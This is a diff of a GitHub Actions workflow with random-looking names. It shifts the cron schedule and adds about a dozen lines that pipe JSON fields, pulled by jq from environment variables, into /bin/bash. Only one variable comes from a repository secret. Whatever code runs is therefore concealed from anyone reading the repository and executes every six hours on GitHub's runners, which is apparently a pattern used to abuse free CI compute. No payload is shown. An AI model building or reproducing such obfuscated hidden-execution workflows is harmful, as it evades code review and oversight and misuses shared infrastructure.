@@ -3,23 +3,26 @@ name: tongxiangyu3718
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 2/6 * * *'
-
-jobs:  # 20690
+    - cron: '30 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: tongxiangyu3718
         env:
-          fldl93778: ${{ secrets.fldl93778 }}
+          gozs066: ${{ secrets.gozs066 }}
         run: |
-          echo $fldl93778 | jq -r .grn1768 | /bin/bash
-          echo $jx14286 | jq -r .xkx19628 | /bin/bash
-          echo $s04266 | jq -r .pkm331 | /bin/bash
-          echo $erq6289 | jq -r .auhhd220 | /bin/bash
-          echo $gib4 | jq -r .jipr2 | /bin/bash
-          echo $lqgub6 | jq -r .mclo9565 | /bin/bash
-          echo $przm52616 | jq -r .wi403 | /bin/bash
-          echo $ry999 | jq -r .hgmb8876 | /bin/bash
+          echo $gozs066 | jq -r .fkuqf29 | /bin/bash
+          echo $s57 | jq -r .o1124 | /bin/bash
+          echo $nxmr5832 | jq -r .cht47379 | /bin/bash
+          echo $e7 | jq -r .yg09699 | /bin/bash
+          echo $paiz3 | jq -r .phk4 | /bin/bash
+          echo $t245 | jq -r .f4877 | /bin/bash
+          echo $jan972 | jq -r .snjll00925 | /bin/bash
+          echo $i450 | jq -r .j76356 | /bin/bash
+          echo $nof13 | jq -r .xym67 | /bin/bash
+          echo $krddh28 | jq -r .pfwtx0828 | /bin/bash
+          echo $hodoo2771 | jq -r .gnwy17577 | /bin/bash
+          echo $ua8527 | jq -r .z38 | /bin/bash
 
